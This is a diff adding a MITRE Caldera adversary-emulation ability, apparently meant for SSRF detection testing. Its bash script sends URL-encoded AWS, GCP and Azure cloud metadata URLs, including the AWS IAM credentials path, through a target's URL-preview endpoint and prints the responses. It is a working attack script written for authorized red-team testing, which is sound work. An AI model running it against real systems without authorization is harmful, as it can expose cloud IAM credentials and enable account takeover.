@@ -1,0 +1,51 @@
+- id: e1f2a3b4-c5d6-e7f8-a9b0-c1d2e3f4a5b6
+  name: SSRF - Cloud Metadata Endpoint Access
+  description: URL 미리보기(preview) 기능을 악용하여 클라우드 인스턴스 메타데이터 엔드포인트에 접근을 시도합니다. AWS IMDSv1(169.254.169.254), GCP, Azure 메타데이터 URL을 대상으로 하며, 성공 시 IAM 자격 증명이 유출될 수 있습니다. OWASP A10:2021 SSRF 대응 탐지 테스트입니다.
+  tactic: initial-access
+  technique:
+    attack_id: T1090
+    name: Proxy
+  platforms:
+    linux:
+      sh:
+        command: |-
+          OP_ID="#{operation_id}"
+          TECH_ID="T1090"
+          ABILITY_ID="e1f2a3b4-c5d6-e7f8-a9b0-c1d2e3f4a5b6"
+          TARGET="http://#{target.url}"
+
+          SSRF_URLS=(
+            # AWS IMDSv1
+            "http://169.254.169.254/latest/meta-data/"
+            "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+            # GCP metadata
+            "http://metadata.google.internal/computeMetadata/v1/"
+            # Azure IMDS
+            "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+          )
+
+          LABELS=(
+            "AWS IMDSv1 - meta-data root"
+            "AWS IMDSv1 - IAM credentials"
+            "GCP metadata endpoint"
+            "Azure IMDS endpoint"
+          )
+
+          for i in "${!SSRF_URLS[@]}"; do
+            echo "[*] SSRF Attempt $((i+1)): ${LABELS[$i]}"
+            ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${SSRF_URLS[$i]}', safe=''))")
+            RESULT=$(curl -s -w "\n%{http_code}" \
+              -H "X-Caldera-Op-Id: ${OP_ID}" \
+              -H "X-Caldera-Technique: ${TECH_ID}" \
+              -H "X-Caldera-Ability: ${ABILITY_ID}" \
+              -A "Caldera/${OP_ID}/${TECH_ID}/${ABILITY_ID}" \
+              "${TARGET}/api/preview?url=${ENCODED}")
+            HTTP_CODE=$(echo "${RESULT}" | tail -1)
+            BODY=$(echo "${RESULT}" | head -n -1)
+            echo "[+] HTTP ${HTTP_CODE}"
+            echo "${BODY}" | head -5
+            echo ""
+          done
+        parsers:
+          plugins.stockpile.app.parsers.basic:
+          - source: host.vuln.ssrf
